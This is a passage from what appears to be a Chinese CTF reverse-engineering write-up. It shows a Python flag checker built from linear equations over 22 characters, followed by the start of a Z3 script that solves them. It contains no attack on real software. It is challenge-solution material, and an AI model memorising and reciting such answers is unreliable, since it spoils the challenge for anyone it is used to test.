* <span class="number">3313</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">9286</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">74</span> == <span class="number">10568195</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">4974</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">4445</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">7368</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">9132</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">5894</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">7822</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">7923</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">6822</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2698</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">3643</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">8392</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">4126</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">1941</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">6641</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">2949</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">7405</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">9980</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">6349</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">3328</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">8766</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">9508</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">65</span> == <span class="number">12514783</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">4127</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">4703</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6409</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4907</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">5230</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">3371</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">5666</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">3194</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">5448</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">8415</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">4525</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">4152</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">1467</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">5254</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">2256</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">1643</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">9113</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">8805</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">4315</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">8371</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">1919</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">2</span> == <span class="number">10299950</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">6245</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8783</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6059</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">9375</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">9253</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">1974</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">8867</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">6423</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2577</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">6613</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">2040</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">2209</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">4147</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">7151</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">1011</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">9446</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4362</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">3073</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">3006</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5499</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">8850</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">23</span> == <span class="number">11180727</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">1907</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9038</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">3932</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">7054</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">1135</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">5095</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">6962</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">6481</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">7049</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">5995</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">6233</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">1321</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">4455</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">8181</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">5757</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">6953</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">3167</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">5508</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">4602</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">1420</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">3075</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">25</span> == <span class="number">10167536</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">1489</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9236</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">7398</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4088</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">4131</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">1657</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">9068</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">6420</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">3970</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">3265</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">5343</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">5386</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">2583</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">2813</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">7181</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">9116</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4836</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">6917</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">1123</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">7276</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">2257</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">65</span> == <span class="number">10202212</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">2097</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1253</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">1469</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">2731</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">9565</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9185</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">1095</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">8666</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2919</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">7962</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">1497</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">6642</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">4108</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">6892</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">7161</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">7552</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">5666</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">4060</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7799</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5080</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">8516</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">43</span> == <span class="number">10435786</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">1461</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1676</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">4755</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">7982</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">3860</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">1067</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">6715</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">4019</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">4983</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">2031</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">1173</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">2241</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">2594</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">8672</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">4810</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">7963</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">7749</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">5730</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">9855</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5858</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">2349</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">71</span> == <span class="number">9526385</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">9025</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9536</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">1515</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">8177</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">6109</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">4856</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">6692</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">4929</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">1010</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">3995</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">3511</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">5910</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">3501</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">3731</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">6601</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">6200</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">8177</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">5488</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">5957</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">9661</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">4956</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">48</span> == <span class="number">11822714</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">4462</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1940</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">5956</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4965</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">9268</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9627</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">3564</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">5417</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2039</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">7269</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">9667</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">4158</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">2856</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">2851</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9696</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">5986</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">6237</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">5845</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">5467</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5227</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">4771</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">72</span> == <span class="number">11486796</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">4618</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8621</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">8144</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">7115</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">1577</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">8602</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">3886</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">3712</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">1258</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">7063</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">1872</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">9855</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">4167</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">7615</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">6298</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">7682</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">8795</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">3856</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">6217</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5764</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">5076</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">93</span> == <span class="number">11540145</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">7466</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8442</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">4822</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">7639</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">2049</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">7311</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">5816</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">8433</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">5905</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">4838</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">1251</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">8184</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">6465</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">4634</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">5513</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">3160</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">6720</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">9205</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">6671</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">7716</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">1905</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">29</span> == <span class="number">12227250</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">5926</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9095</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">2048</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4639</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">3035</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9560</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">1591</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">2392</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">1812</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">6732</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">9454</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">8175</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">7346</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">6333</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9812</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">2034</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">6634</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">1762</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7058</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">3524</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">7462</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">11</span> == <span class="number">11118093</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congratulate!!!You are right!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;What a pity...Please try again &gt;__&lt;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>使用Z3求解器解出最后的结果</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag = [Int(<span class="string">&quot;input[%d]&quot;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">7072</span> + flag[<span class="number">1</span>] * <span class="number">2523</span> + flag[<span class="number">2</span>] * <span class="number">6714</span> + flag[<span class="number">3</span>] * <span class="number">8810</span> +flag[<span class="number">4</span>] * <span class="number">6796</span> + flag[<span class="number">5</span>] * <span class="number">2647</span> + flag[<span class="number">6</span>] * <span class="number">1347</span> + flag[<span class="number">7</span>] * <span class="number">1289</span> + flag[<span class="number">8</span>] *<span class="number">8917</span> + flag[<span class="number">9</span>] * <span class="number">2304</span> + flag[<span class="number">10</span>] * <span class="number">5001</span> + flag[<span class="number">11</span>] * <span class="number">2882</span> + flag[<span class="number">12</span>] * <span class="number">7232</span> +flag[<span class="number">13</span>] * <span class="number">3192</span> + flag[<span class="number">14</span>] * <span class="number">9676</span> + flag[<span class="number">15</span>] * <span class="number">5436</span> + flag[<span class="number">16</span>] * <span class="number">4407</span> + flag[<span class="number">17</span>]* <span class="number">6269</span> + flag[<span class="number">18</span>] * <span class="number">9623</span> + flag[<span class="number">19</span>] * <span class="number">6230</span> + flag[<span class="number">20</span>] * <span class="number">6292</span> + flag[<span class="number">21</span>] * <span class="number">57</span> ==<span class="number">10743134</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">3492</span> + flag[<span class="number">1</span>] * <span class="number">1613</span> + flag[<span class="number">2</span>] * <span class="number">3234</span> + flag[<span class="number">3</span>] * <span class="number">5656</span> +flag[<span class="number">4</span>] * <span class="number">9182</span> + flag[<span class="number">5</span>] * <span class="number">4240</span> + flag[<span class="number">6</span>] * <span class="number">8808</span> + flag[<span class="number">7</span>] * <span class="number">9484</span> + flag[<span class="number">8</span>] *<span class="number">4000</span> + flag[<span class="number">9</span>] * <span class="number">1475</span> + flag[<span class="number">10</span>] * <span class="number">2616</span> + flag[<span class="number">11</span>] * <span class="number">2766</span> + flag[<span class="number">12</span>] * <span class="number">6822</span> +flag[<span class="number">13</span>] * <span class="number">1068</span> + flag[<span class="number">14</span>] * <span class="number">9768</span> + flag[<span class="number">15</span>] * <span class="number">1420</span> + flag[<span class="number">16</span>] * <span class="number">4528</span> + flag[<span class="number">17</span>]* <span class="number">1031</span> + flag[<span class="number">18</span>] * <span class="number">8388</span> + flag[<span class="number">19</span>] * <span class="number">2029</span> + flag[<span class="number">20</span>] * <span class="number">2463</span> + flag[<span class="number">21</span>] * <span class="number">32</span> ==<span class="number">9663091</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">9661</span> + flag[<span class="number">1</span>] * <span class="number">1108</span> + flag[<span class="number">2</span>] * <span class="number">2229</span> + flag[<span class="number">3</span>] * <span class="number">1256</span> +flag[<span class="number">4</span>] * <span class="number">7747</span> + flag[<span class="number">5</span>] * <span class="number">5775</span> + flag[<span class="number">6</span>] * <span class="number">5211</span> + flag[<span class="number">7</span>] * <span class="number">2387</span> + flag[<span class="number">8</span>] *<span class="number">1997</span> + flag[<span class="number">9</span>] * <span class="number">4045</span> + flag[<span class="number">10</span>] * <span class="number">7102</span> + flag[<span class="number">11</span>] * <span class="number">7853</span> + flag[<span class="number">12</span>] * <span class="number">5596</span> +flag[<span class="number">13</span>] * <span class="number">6952</span> + flag[<span class="number">14</span>] * <span class="number">8883</span> + flag[<span class="number">15</span>] * <span class="number">5125</span> + flag[<span class="number">16</span>] * <span class="number">9572</span> + flag[<span class="number">17</span>]* <span class="number">1149</span> + flag[<span class="number">18</span>] * <span class="number">7583</span> + flag[<span class="number">19</span>] * <span class="number">1075</span> + flag[<span class="number">20</span>] * <span class="number">9804</span> + flag[<span class="number">21</span>] * <span class="number">72</span> ==<span class="number">10521461</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">4314</span> + flag[<span class="number">1</span>] * <span class="number">3509</span> + flag[<span class="number">2</span>] * <span class="number">6200</span> + flag[<span class="number">3</span>] * <span class="number">5546</span> +flag[<span class="number">4</span>] * <span class="number">1705</span> + flag[<span class="number">5</span>] * <span class="number">9518</span> + flag[<span class="number">6</span>] * <span class="number">2975</span> + flag[<span class="number">7</span>] * <span class="number">2689</span> + flag[<span class="number">8</span>] *<span class="number">2412</span> + flag[<span class="number">9</span>] * <span class="number">8659</span> + flag[<span class="number">10</span>] * <span class="number">5459</span> + flag[<span class="number">11</span>] * <span class="number">7572</span> + flag[<span class="number">12</span>] * <span class="number">3042</span> +flag[<span class="number">13</span>] * <span class="number">9701</span> + flag[<span class="number">14</span>] * <span class="number">4697</span> + flag[<span class="number">15</span>] * <span class="number">9863</span> + flag[<span class="number">16</span>] * <span class="number">1296</span> + flag[<span class="number">17</span>]* <span class="number">1278</span> + flag[<span class="number">18</span>] * <span class="number">5721</span> + flag[<span class="number">19</span>] * <span class="number">5116</span> + flag[<span class="number">20</span>] * <span class="number">4147</span> + flag[<span class="number">21</span>] * <span class="number">52</span> ==<span class="number">9714028</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">2310</span> + flag[<span class="number">1</span>] * <span class="number">1379</span> + flag[<span class="number">2</span>] * <span class="number">5900</span> + flag[<span class="number">3</span>] * <span class="number">4876</span> +flag[<span class="number">4</span>] * <span class="number">5329</span> + flag[<span class="number">5</span>] * <span class="number">6485</span> + flag[<span class="number">6</span>] * <span class="number">6610</span> + flag[<span class="number">7</span>] * <span class="number">7179</span> + flag[<span class="number">8</span>] *<span class="number">7897</span> + flag[<span class="number">9</span>] * <span class="number">1094</span> + flag[<span class="number">10</span>] * <span class="number">4825</span> + flag[<span 